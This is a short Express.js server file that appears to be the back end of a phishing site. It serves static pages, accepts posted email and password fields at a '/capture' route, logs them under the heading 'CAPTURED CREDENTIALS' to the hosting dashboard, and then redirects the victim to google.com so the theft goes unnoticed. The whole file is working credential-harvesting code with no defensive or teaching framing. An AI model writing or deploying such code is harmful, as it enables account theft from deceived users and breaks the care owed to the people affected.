const express = require('express');
const path = require('path');
const app = express();

// Middleware to parse form data and JSON
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve all static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Capture route handling form submissions
app.post('/capture', (req, res) => {
    const { email, password } = req.body;
    
    // Logs directly to Render's Dashboard -> Logs tab
    console.log('\n--- CAPTURED CREDENTIALS ---');
    console.log(`Time: ${new Date().toISOString()}`);
    console.log(`Email: ${email}`);
    console.log(`Password: ${password}`);
    console.log('----------------------------\n');

    // Redirect user to the official site after submission
    res.redirect('https://www.google.com');
});

// Use Render's dynamic port or default to 3000 locally
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running and listening on port ${PORT}`);
});
